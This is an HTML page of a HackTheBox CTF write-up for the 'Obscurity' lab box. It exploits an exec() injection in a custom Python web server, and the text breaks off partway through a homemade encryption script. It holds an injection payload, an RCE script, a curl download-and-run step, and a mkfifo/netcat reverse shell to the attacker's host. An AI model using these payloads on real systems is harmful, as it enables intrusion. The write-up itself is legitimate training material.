<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>Obscurity - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Table of contents    User Flag Recon  Remote Code Execution -&amp;gt; www-data shell Pivot www-data -&amp;gt; Robert Recovering the secret key   Root Flag  Recon Cracking Root password hash       Just finished the newly released Obscurity box on Hackthbox. I have to say it was a really cool box that required a lot of custom exploitation and cover various topics such as command injection, a little crypto and misconfigurations."/>
<meta name="keywords" content="hackthebox, ctf, obscurity, python, custom-exploitation, encryption, re, john"/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="/posts/obscurity/" />




<link rel="stylesheet" href="/assets/style.css">


<link rel="stylesheet" href="/style.css">


<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
<link rel="shortcut icon" href="/img/favicon.png">

<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">

<link rel="shortcut icon" href="/img/favicon.ico">



<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Obscurity - HackTheBox"/>
<meta name="twitter:description" content="Just finished the newly released Obscurity box on Hackthbox. I have to say it was a really cool box that required a lot of custom exploitation and cover various topics such as command injection, a little crypto and misconfigurations. I wouldn&#39;t say it&#39;s an easy one but it&#39;s a pretty good one for developers comfortable with Python and want to level up in CTF.

**Tl;Dr:** The user flag consisted in grabbing the source code of the server running port 80, &#34;reverse engineer&#34; it to find a command injection flaw in its workflow. From there you achieve remote code execution as `www-data`. As `www-data` you can access `Robert` user `/home/` directory filed with a encrypted password reminder file and a &#34;homemade&#34; python encryption script. Reversing this script you can recover the password used to encrypt the password reminder file. Once decrypted you use this password in the file to pivot to `Robert` user and grab the flag.  
The root flag was accessible by abusing another homemade python script used to get a shell as root, when reverse engineer it you discover the script temporary store all users password hashes to the `/tmp` folder when running but immediately deletes them. You can write a script to grab the hashes fast enough before they get deleted, crack the hash of root and connect with the `root` account to grab the flag.

Alright! Let&#39;s get into the details now!
"/>



<meta property="og:title" content="Obscurity - HackTheBox" />
<meta property="og:description" content="Just finished the newly released Obscurity box on Hackthbox. I have to say it was a really cool box that required a lot of custom exploitation and cover various topics such as command injection, a little crypto and misconfigurations. I wouldn&#39;t say it&#39;s an easy one but it&#39;s a pretty good one for developers comfortable with Python and want to level up in CTF.

**Tl;Dr:** The user flag consisted in grabbing the source code of the server running port 80, &#34;reverse engineer&#34; it to find a command injection flaw in its workflow. From there you achieve remote code execution as `www-data`. As `www-data` you can access `Robert` user `/home/` directory filed with a encrypted password reminder file and a &#34;homemade&#34; python encryption script. Reversing this script you can recover the password used to encrypt the password reminder file. Once decrypted you use this password in the file to pivot to `Robert` user and grab the flag.  
The root flag was accessible by abusing another homemade python script used to get a shell as root, when reverse engineer it you discover the script temporary store all users password hashes to the `/tmp` folder when running but immediately deletes them. You can write a script to grab the hashes fast enough before they get deleted, crack the hash of root and connect with the `root` account to grab the flag.

Alright! Let&#39;s get into the details now!
" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/obscurity/" />
<meta property="article:published_time" content="2020-05-09T00:00:00+00:00" />
<meta property="article:modified_time" content="2020-05-09T00:00:00+00:00" /><meta property="og:site_name" content="hg8&#39;s Notes" />






  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
</svg>
</span>
    <span class="logo__text">./hg8.sh</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        
<nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/">Posts</a></li>
        
      
        
          <li><a href="/tags">Tags</a></li>
        
      
        
          <li><a href="/about">About</a></li>
        
      
      
    
    <li>
<a href="/search" title="Search">
<img src="/icon/search.svg" alt="search" height="20">
</a>
<li>
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/">Posts</a></li>
      
    
      
        <li><a href="/tags">Tags</a></li>
      
    
      
        <li><a href="/about">About</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h1 class="post-title"><a href="/posts/obscurity/">Obscurity - HackTheBox</a></h1>
    <div class="post-meta">
      
        <span class="post-date">
          2020-05-09
        </span>

        
          
        
      

      <span class="post-author">— Written by hg8</span>
      
        <span class="post-read-time">— 19 min read</span>
      
    </div>

    
      <span class="post-tags">
        
          #<a href="/tags/hackthebox/">hackthebox</a>&nbsp;
        
          #<a href="/tags/ctf/">ctf</a>&nbsp;
        
          #<a href="/tags/obscurity/">obscurity</a>&nbsp;
        
          #<a href="/tags/python/">python</a>&nbsp;
        
          #<a href="/tags/custom-exploitation/">custom-exploitation</a>&nbsp;
        
          #<a href="/tags/encryption/">encryption</a>&nbsp;
        
          #<a href="/tags/re/">re</a>&nbsp;
        
          #<a href="/tags/john/">john</a>&nbsp;
        
      </span>
    

    
      
        <img src="/img/obscurity-hackthebox.png" class="post-cover" />
      
    

    <div class="post-content">
      <hr>
<details open class="entry-toc">
  <summary>
    <span>
        <b>Table of contents</b>
    </span>
  </summary>
  <nav id="TableOfContents">
  <ul>
    <li><a href="#user-flag">User Flag</a></li>
    <li><a href="#recon">Recon</a>
      <ul>
        <li><a href="#remote-code-execution---www-data-shell">Remote Code Execution -&gt; www-data shell</a></li>
        <li><a href="#pivot-www-data---robert">Pivot www-data -&gt; Robert</a></li>
        <li><a href="#recovering-the-secret-key">Recovering the secret key</a></li>
      </ul>
    </li>
    <li><a href="#root-flag">Root Flag</a>
      <ul>
        <li><a href="#recon-1">Recon</a></li>
        <li><a href="#cracking-root-password-hash">Cracking Root password hash</a></li>
      </ul>
    </li>
  </ul>
</nav>
</details>

<hr>
<p>Just finished the newly released Obscurity box on Hackthbox. I have to say it was a really cool box that required a lot of custom exploitation and cover various topics such as command injection, a little crypto and misconfigurations. I wouldn&rsquo;t say it&rsquo;s an easy one but it&rsquo;s a pretty good one for developers comfortable with Python and want to level up in CTF.</p>
<p><strong>Tl;Dr:</strong> The user flag consisted in grabbing the source code of the server running port 80, &ldquo;reverse engineer&rdquo; it to find a command injection flaw in its workflow. From there you achieve remote code execution as <code>www-data</code>. As <code>www-data</code> you can access <code>Robert</code> user <code>/home/</code> directory filed with a encrypted password reminder file and a &ldquo;homemade&rdquo; python encryption script. Reversing this script you can recover the password used to encrypt the password reminder file. Once decrypted you use this password in the file to pivot to <code>Robert</code> user and grab the flag.<br>
The root flag was accessible by abusing another homemade python script used to get a shell as root, when reverse engineer it you discover the script temporary store all users password hashes to the <code>/tmp</code> folder when running but immediately deletes them. You can write a script to grab the hashes fast enough before they get deleted, crack the hash of root and connect with the <code>root</code> account to grab the flag.</p>
<p>Alright! Let&rsquo;s get into the details now!</p>
<hr>
<p>First thing first, let&rsquo;s add the box IP to the host file:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#34;10.10.10.168 obscurity.htb&#34;</span> &gt;&gt; /etc/hosts
</code></pre></div><p>and let&rsquo;s start!</p>
<h2 id="user-flag">User Flag</h2>
<h2 id="recon">Recon</h2>
<p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nmap -sV -sT -sC obscurity.htb
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-12-26 09:56 CET
Nmap scan report <span style="color:#66d9ef">for</span> obscurity.htb <span style="color:#f92672">(</span>10.10.10.168<span style="color:#f92672">)</span>
Host is up <span style="color:#f92672">(</span>0.038s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">996</span> filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
80/tcp   closed http
8080/tcp open   http-proxy BadHTTPServer
9000/tcp closed cslistener
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 16.09 seconds
</code></pre></div><p>Bit less classic than usual, port 80 is closed, <code>nmap</code> return 9000 port which is closed (no idea what this is so we keep it in mind for later maybe).<br>
The ssh port 22 is open and the 8080 one running <code>BadHTTPServer</code>&hellip; Intriguing.</p>
<p>Let&rsquo;s dig it on this &ldquo;bad&rdquo; server.<br>
Opening <code>http://obsurity.htb:8080/</code> display the following website:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/71549328-fee0f400-29bb-11ea-9df7-81ea1b4d4ae6.png" alt="obscurity"></p>
<p>Looking around we notice this interesting message:</p>
<blockquote>
<p>Message to server devs: the current source code for the web server is in &lsquo;SuperSecureServer.py&rsquo; in the secret development directory.</p>
</blockquote>
<p>Well, since we don&rsquo;t have other entry point yet, let&rsquo;s try to bruteforce our way to find this &ldquo;secret&rdquo; directory name.</p>
<p>This time I decided to give <a href="https://github.com/ffuf/ffuf"><code>ffuf</code></a> (&ldquo;a fast web fuzzer written in Go&rdquo;) a try. It&rsquo;s usage is pretty straightforward and similar to <code>wfuzz</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ffuf -w ~/SecLists/Discovery/Web-Content/big.txt -u <span style="color:#e6db74">&#34;http://obscurity.htb:8080/FUZZ/SuperSecureServer.py&#34;</span>
        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/
       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/
         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\
</span><span style="color:#ae81ff"></span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/
       v1.0-rc1
________________________________________________
 :: Method           : GET
 :: URL              : http://obscurity.htb:8080/FUZZ/SuperSecureServer.py
________________________________________________
develop                 <span style="color:#f92672">[</span>Status: 200, Size: 5892, Words: 1806, Lines: 171<span style="color:#f92672">]</span>
:: Progress: <span style="color:#f92672">[</span>20470/20470<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">222</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:01:32<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
</code></pre></div><p>Got it! The secret directory was <code>develop</code>.</p>
<p>Let&rsquo;s open this <code>SuperSecureServer.py</code> to take a look:</p>


  
    <pre class="language-python line-numbers"
      ><code class="language-python"
      >import socket
import threading
from datetime import datetime
import sys
import os
import mimetypes
import urllib.parse
import subprocess
respTemplate = &#34;&#34;&#34;HTTP/1.1 {statusNum} {statusCode}
Date: {dateSent}
Server: {server}
Last-Modified: {modified}
Content-Length: {length}
Content-Type: {contentType}
Connection: {connectionType}
{body}
&#34;&#34;&#34;
DOC_ROOT = &#34;DocRoot&#34;
CODES = {&#34;200&#34;: &#34;OK&#34;,
        &#34;304&#34;: &#34;NOT MODIFIED&#34;,
        &#34;400&#34;: &#34;BAD REQUEST&#34;, &#34;401&#34;: &#34;UNAUTHORIZED&#34;, &#34;403&#34;: &#34;FORBIDDEN&#34;, &#34;404&#34;: &#34;NOT FOUND&#34;,
        &#34;500&#34;: &#34;INTERNAL SERVER ERROR&#34;}
MIMES = {&#34;txt&#34;: &#34;text/plain&#34;, &#34;css&#34;:&#34;text/css&#34;, &#34;html&#34;:&#34;text/html&#34;, &#34;png&#34;: &#34;image/png&#34;, &#34;jpg&#34;:&#34;image/jpg&#34;,
        &#34;ttf&#34;:&#34;application/octet-stream&#34;,&#34;otf&#34;:&#34;application/octet-stream&#34;, &#34;woff&#34;:&#34;font/woff&#34;, &#34;woff2&#34;: &#34;font/woff2&#34;,
        &#34;js&#34;:&#34;application/javascript&#34;,&#34;gz&#34;:&#34;application/zip&#34;, &#34;py&#34;:&#34;text/plain&#34;, &#34;map&#34;: &#34;application/octet-stream&#34;}
class Response:
    def __init__(self, **kwargs):
        self.__dict__.update(kwargs)
        now = datetime.now()
        self.dateSent = self.modified = now.strftime(&#34;%a, %d %b %Y %H:%M:%S&#34;)
    def stringResponse(self):
        return respTemplate.format(**self.__dict__)
class Request:
    def __init__(self, request):
        self.good = True
        try:
            request = self.parseRequest(request)
            self.method = request[&#34;method&#34;]
            self.doc = request[&#34;doc&#34;]
            self.vers = request[&#34;vers&#34;]
            self.header = request[&#34;header&#34;]
            self.body = request[&#34;body&#34;]
        except:
            self.good = False
    def parseRequest(self, request):
        req = request.strip(&#34;\r&#34;).split(&#34;\n&#34;)
        method,doc,vers = req[0].split(&#34; &#34;)
        header = req[1:-3]
        body = req[-1]
        headerDict = {}
        for param in header:
            pos = param.find(&#34;: &#34;)
            key, val = param[:pos], param[pos&#43;2:]
            headerDict.update({key: val})
        return {&#34;method&#34;: method, &#34;doc&#34;: doc, &#34;vers&#34;: vers, &#34;header&#34;: headerDict, &#34;body&#34;: body}
class Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))
    def listen(self):
        self.sock.listen(5)
        while True:
            client, address = self.sock.accept()
            client.settimeout(60)
            threading.Thread(target = self.listenToClient,args = (client,address)).start()
    def listenToClient(self, client, address):
        size = 1024
        while True:
            try:
                data = client.recv(size)
                if data:
                    # Set the response to echo back the recieved data
                    req = Request(data.decode())
                    self.handleRequest(req, client, address)
                    client.shutdown()
                    client.close()
                else:
                    raise error(&#39;Client disconnected&#39;)
            except:
                client.close()
                return False
    def handleRequest(self, request, conn, address):
        if request.good:

# try:

                # print(str(request.method) &#43; &#34; &#34; &#43; str(request.doc), end=&#39; &#39;)
                # print(&#34;from {0}&#34;.format(address[0]))

# except Exception as e:

# print(e)

            document = self.serveDoc(request.doc, DOC_ROOT)
            statusNum=document[&#34;status&#34;]
        else:
            document = self.serveDoc(&#34;/errors/400.html&#34;, DOC_ROOT)
            statusNum=&#34;400&#34;
        body = document[&#34;body&#34;]
        statusCode=CODES[statusNum]
        dateSent = &#34;&#34;
        server = &#34;BadHTTPServer&#34;
        modified = &#34;&#34;
        length = len(body)
        contentType = document[&#34;mime&#34;] # Try and identify MIME type from string
        connectionType = &#34;Closed&#34;
        resp = Response(
        statusNum=statusNum, statusCode=statusCode,
        dateSent = dateSent, server = server,
        modified = modified, length = length,
        contentType = contentType, connectionType = connectionType,
        body = body
        )
        data = resp.stringResponse()
        if not data:
            return -1
        conn.send(data.encode())
        return 0
    def serveDoc(self, path, docRoot):
        path = urllib.parse.unquote(path)
        try:
            info = &#34;output = &#39;Document: {}&#39;&#34; # Keep the output for later debug
            exec(info.format(path)) # This is how you do string formatting, right?
            cwd = os.path.dirname(os.path.realpath(__file__))
            docRoot = os.path.join(cwd, docRoot)
            if path == &#34;/&#34;:
                path = &#34;/index.html&#34;
            requested = os.path.join(docRoot, path[1:])
            if os.path.isfile(requested):
                mime = mimetypes.guess_type(requested)
                mime = (mime if mime[0] != None else &#34;text/html&#34;)
                mime = MIMES[requested.split(&#34;.&#34;)[-1]]
                try:
                    with open(requested, &#34;r&#34;) as f:
                        data = f.read()
                except:
                    with open(requested, &#34;rb&#34;) as f:
                        data = f.read()
                status = &#34;200&#34;
            else:
                errorPage = os.path.join(docRoot, &#34;errors&#34;, &#34;404.html&#34;)
                mime = &#34;text/html&#34;
                with open(errorPage, &#34;r&#34;) as f:
                    data = f.read().format(path)
                status = &#34;404&#34;
        except Exception as e:
            print(e)
            errorPage = os.path.join(docRoot, &#34;errors&#34;, &#34;500.html&#34;)
            mime = &#34;text/html&#34;
            with open(errorPage, &#34;r&#34;) as f:
                data = f.read()
            status = &#34;500&#34;
        return {&#34;body&#34;: data, &#34;mime&#34;: mime, &#34;status&#34;: status}</code></pre>
  


<p>The source code is worth reading, taking a bit of time to understand give some really interesting insight on the working of this http server.</p>
<h3 id="remote-code-execution---www-data-shell">Remote Code Execution -&gt; www-data shell</h3>
<p>If you are used to python development (and ctf&hellip;), a line should quickly catch your eye:</p>


  
    <pre class="language-python line-numbers"
      ><code class="language-python"
      >exec(info.format(path))</code></pre>
  


<p>As a reminded <a href="https://docs.python.org/3/library/functions.html#exec"><code>exec()</code></a> dynamically execute Python code passed as argument.<br>
Like <code>eval()</code> it&rsquo;s usage is <a href="https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html">dangerous</a> and open door to injections.</p>
<p>Let&rsquo;s see if we can use this flow to achieve remote code execution on the server.
Can we inject code in <code>info</code> variable ?</p>


  
    <pre class="language-python line-numbers"
      ><code class="language-python"
      >info = &#34;output = &#39;Document: {}&#39;&#34;</code></pre>
  


<p>Nope&hellip; <code>path</code> then?</p>


  
    <pre class="language-python line-numbers"
      ><code class="language-python"
      >def parseRequest(self, request):
    req = request.strip(&#34;\r&#34;).split(&#34;\n&#34;)
    method,doc,vers = req[0].split(&#34; &#34;)
[...]
def handleRequest(self, request, conn, address):
    if request.good:
        document = self.serveDoc(request.doc, DOC_ROOT)
[...]
def serveDoc(self, path, docRoot):
    path = urllib.parse.unquote(path)</code></pre>
  


<p>As we could have have guess <code>path</code> contains the url requested to the server and, good news for us, no sanitization is being made.</p>
<p>In the same way as SQL injection, let&rsquo;s try to inject Python code that will lead to remote code injection on the server.</p>
<p>Let&rsquo;s create a simplified script to do so with information we have:</p>


  
    <pre class="language-python line-numbers"
      ><code class="language-python"
      >import os
path = input(&#34;Command to execute: &#34;)
info = &#34;output = &#39;Document: {}&#39;&#34;
print(info.format(path))</code></pre>
  


<p>So let&rsquo;s see what would happen if we pass an <code>os</code> command as path? Let&rsquo;s try with <code>os.system('sleep 5')</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ python injection.py
Command to execute: os.system<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;sleep 5&#39;</span><span style="color:#f92672">)</span>
output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Document: os.system(&#39;</span>sleep 5<span style="color:#e6db74">&#39;)&#39;</span>
</code></pre></div><p>This is not going to work, we will need to escape the python command, let&rsquo;s give it another try:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ python injection.py
Command to execute: <span style="color:#e6db74">&#39;;os.system(&#39;</span>sleep 5<span style="color:#e6db74">&#39;);&#39;</span>
output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Document: &#39;</span>;os.system<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;sleep 5&#39;</span><span style="color:#f92672">)</span>;<span style="color:#e6db74">&#39;&#39;</span>
</code></pre></div><p>Looks good to me and doesn&rsquo;t throw error, let&rsquo;s add the same <code>exec()</code> than in the original to make sure the injection will work properly against the server:</p>


  
    <pre class="language-python line-numbers"
      ><code class="language-python"
      >import os
path = &#34;&#39;;os.system(&#39;sleep 5&#39;);&#39;&#34;
info = &#34;output = &#39;Document: {}&#39;&#34;
exec(info.format(path))</code></pre>
  


<p>And let&rsquo;s run it, if it hang for 5 seconds then it mean our injection was successful:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ time python injection.py
python tmp.py  0.02s user 0.01s system 0% cpu 5.029 total
</code></pre></div><p>It worked perfectly. Let&rsquo;s now gather everything we know to achieve remote code execution on the server:</p>


  
    <pre class="language-python line-numbers"
      ><code class="language-python"
      >import os
import requests
url = &#34;http://obscurity.htb:8080/&#39;;os.system(&#39;{}&#39;);&#39;&#34;
while True:
    cmd = input(&#34;Command to execute: &#34;)
    r = requests.get(url.format(cmd))</code></pre>
  


<p>We will try to execute a reserve shell. After having no luck getting the classical <code>netcat</code> nor <code>python</code> reverse shell to work (which is strange since we know python is running on the box), I managed to get the <a href="https://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498"><code>fifo netcat</code></a> reverse shell to work:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ cat hg8.sh
rm /tmp/h;mkfifo /tmp/h;cat /tmp/h|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 <span style="color:#ae81ff">8585</span> &gt;/tmp/h
<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ python -m http.server
Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
</code></pre></div><p>Then we open our listener:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
Listening on any address <span style="color:#ae81ff">8585</span>
</code></pre></div><p>And finally we send our payload:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ python rce.py
Command to execute: curl 10.10.10.10:8000/hg8.sh -o /tmp/hg8.sh
Command to execute: bash /tmp/hg8.sh
</code></pre></div><p>Aand we get the connection:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
Listening on any address <span style="color:#ae81ff">8585</span>
Connection from 10.10.10.168:43378
$ id
uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
</code></pre></div><p><em>Note: Looking around we immediately notice that the python bin used is <code>pyhton3</code> that&rsquo;s why the common <code>python</code> shell wasn&rsquo;t working. As usual it&rsquo;s easy to overlook simple blockers like this one&hellip;</em></p>
<h3 id="pivot-www-data---robert">Pivot www-data -&gt; Robert</h3>
<p>Quick recon shows that the user is <code>robert</code> and have a few interesting files we can read:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@obscure:/$ ls -l /home/robert/
ls -l /home/robert/
total <span style="color:#ae81ff">24</span>
drwxr-xr-x <span style="color:#ae81ff">2</span> root   root   <span style="color:#ae81ff">4096</span> Dec  <span style="color:#ae81ff">2</span> 09:47 BetterSSH
-rw-rw-r-- <span style="color:#ae81ff">1</span> robert robert   <span style="color:#ae81ff">94</span> Sep <span style="color:#ae81ff">26</span> 23:08 check.txt
-rw-rw-r-- <span style="color:#ae81ff">1</span> robert robert  <span style="color:#ae81ff">185</span> Oct  <span style="color:#ae81ff">4</span> 15:01 out.txt
-rw-rw-r-- <span style="color:#ae81ff">1</span> robert robert   <span style="color:#ae81ff">27</span> Oct  <span style="color:#ae81ff">4</span> 15:01 passwordreminder.txt
-rwxrwxr-x <span style="color:#ae81ff">1</span> robert robert <span style="color:#ae81ff">2514</span> Oct  <span style="color:#ae81ff">4</span> 14:55 SuperSecureCrypt.py
-rwx------ <span style="color:#ae81ff">1</span> robert robert   <span style="color:#ae81ff">33</span> Sep <span style="color:#ae81ff">25</span> 14:12 user.txt
</code></pre></div><p><code>passwordreminder.txt</code> sure looks interesting&hellip; Let&rsquo;s check it out:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@obscure:/home/robert/$ cat passwordreminder.txt
´ÑÈÌÉàÙÁÑé¯·¿k
</code></pre></div><p>It&rsquo;s encrypted. What else do we have ? Let&rsquo;s see for <code>check.txt</code> and <code>out.txt</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@obscure:/home/robert/$ cat check.txt
Encrypting this file with your key should result in out.txt, make sure your key is correct!
www-data@obscure:/home/robert/$ cat out.txt
¦ÚÈêÚÞØÛÝÝ ×ÐÊß ÞÊÚÉ æßÝË ÚÛÚê ÙÉë éÑÒÝÍÐ êÆáÙÞã ÒÑ ÐáÙ¦ÕæØ ãÊÎÍ ßÚêÆ Ýáäè ÎÍÚ Îë ÑÓäáÛÌ×  v
</code></pre></div><p>That&rsquo;s interesting. <code>check.txt</code> explain that encrypting this same file will result in <code>out.txt</code> with a given key. We have both clear text message and it&rsquo;s encrypted version.</p>
<p>Something also catch my eye. Did you notice that the encrypted version contain the same number of characters and the same spaces placement than the clear text one?</p>
<p>We can say with confidence that the encryption mechanism seems to simply encrypt each letter one by one using the key somehow. Let&rsquo;s see if we can find more informations and possibly retrieve the key. If we find the key, we can decipher the <code>passwordreminder.txt</code> that will allow us to progress.</p>
<p>We didn&rsquo;t take a look at <code>SuperSecureCrypt.py</code>, it&rsquo;s easy to guess that it&rsquo;s the script used to encrypt those file. This is the script:</p>


  
    <pre class="language-python line-numbers"
      ><code class="language-python"
      >import sys
import argparse

def encrypt(text, key):
    keylen = len(key)
    keyPos = 0
    encrypted = &#34;&#34;
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr &#43; ord(keyChr)) % 255)
        encrypted &#43;= newChr
        keyPos &#43;= 1
        keyPos = keyPos % keylen
    return encrypted

def decrypt(text, key):
    keylen = len(key)
    keyPos = 0
    decrypted = &#34;&#34;
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr - ord(keyChr)) % 255)
        decrypted &#43;= newChr
        keyPos &#43;= 1
        keyPos = keyPos % keylen
    return decrypted

parser = argparse.ArgumentParser(description=&#39;Encrypt with 0bscura\&#39;s encryption algorithm&#39;)

parser.add_argument(&#39;-i&#39;,
                    metavar=&#39;InFile&#39;,
                    type=str,
                    help=&#39;The file to read&#39;,
                    required=False)

parser.add_argument(&#39;-o&#39;,
                    metavar=&#39;OutFile&#39;,
                    type=str,
                    help=&#39;Where to output the encrypted/decrypted file&#39;,
                    required=False)

parser.add_argument(&#39;-k&#39;,
                    metavar=&#39;Key&#39;,
                    type=str,
                    help=&#39;Key to use&#39;,
                    required=False)

parser.add_argument(&#39;-d&#39;, action=&#39;store_true&#39;, help=&#39;Decrypt mode&#39;)

